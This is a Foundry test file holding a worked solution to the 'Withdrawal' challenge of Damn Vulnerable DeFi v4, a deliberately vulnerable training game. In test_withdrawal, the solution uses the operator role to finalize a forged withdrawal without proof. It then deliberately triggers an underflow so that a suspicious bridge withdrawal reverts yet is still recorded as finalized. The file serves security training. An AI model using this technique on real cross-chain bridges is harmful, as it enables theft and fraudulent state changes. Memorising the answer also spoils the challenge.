// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The suspicious withdrawal #2 tries to steal 999,000 DVT. 
         * 
         * As an operator, we can finalize ANY withdrawal parameters without Merkle proof.
         * 
         * EXPLOIT STRATEGY:
         * 1. First, create a FAKE withdrawal that drains enough tokens from the bridge
         *    to cause totalDeposits to underflow when the suspicious withdrawal executes
         * 2. Finalize the legitimate withdrawals (30 DVT total)
         * 3. Finalize the suspicious withdrawal - it will fail due to underflow in
         *    TokenBridge.totalDeposits, but the leaf will still be marked as finalized
         * 
         * totalDeposits = 1,000,000e18 initially
         * If we first withdraw 1,000e18, totalDeposits = 999,000e18
         * Then withdraw 30e18 (legitimate), totalDeposits = 998,970e18
         * Then suspicious tries 999,000e18: 998,970e18 - 999,000e18 = UNDERFLOW!
         */

        vm.warp(START_TIMESTAMP + 8 days);

        address l2Handler_addr = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16;

        // Step 1: Create a FAKE withdrawal to drain tokens and cause underflow later
        // Withdraw 1000 DVT to a random address (NOT player, as player must end with 0)
        address dummyReceiver = address(0xdead);
        bytes memory fakeWithdrawalMsg = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                100, // fake nonce (doesn't conflict with real ones)
                dummyReceiver, // inner l2Sender (not l2TokenBridge, so check passes)
                address(l1TokenBridge),
                abi.encodeCall(TokenBridge.executeTokenWithdrawal, (dummyReceiver, 1000e18))
            )
        );
        
        l1Gateway.finalizeWithdrawal(
            100, // outer nonce
            l2Handler_addr,
            address(l1Forwarder),
            1718787000, // some timestamp
            fakeWithdrawalMsg,
            new bytes32[](0)
        );
        // Now totalDeposits = 999,000e18

        // Step 2: Finalize legitimate withdrawals
        // Withdrawal 0: 10 DVT
        bytes memory msg0 = hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
        
        l1Gateway.finalizeWithdrawal(0, l2Handler_addr, address(l1Forwarder), 1718786915, msg0, new bytes32[](0));
        // totalDeposits = 998,990e18

        // Withdrawal 1: 10 DVT
        bytes memory msg1 = hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
        
        l1Gateway.finalizeWithdrawal(1, l2Handler_addr, address(l1Forwarder), 1718786965, msg1, new bytes32[](0));
        // totalDeposits = 998,980e18

        // Withdrawal 3: 10 DVT (do this before suspicious one)
        bytes memory msg3 = hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
        
        l1Gateway.finalizeWithdrawal(3, l2Handler_addr, address(l1Forwarder), 1718787127, msg3, new bytes32[](0));
        // totalDeposits = 998,970e18

        // Step 3: Finalize the suspicious withdrawal
        // It will try to withdraw 999,000 DVT, but totalDeposits is only 998,970e18
        // This will cause an underflow in totalDeposits -= amount, causing the call to revert
        // But the leaf will still be marked as finalized!
        bytes memory msg2 = hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";
        
        l1Gateway.finalizeWithdrawal(2, l2Handler_addr, address(l1Forwarder), 1718787050, msg2, new bytes32[](0));
        // totalDeposits underflows! Call fails! But leaf is finalized!
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
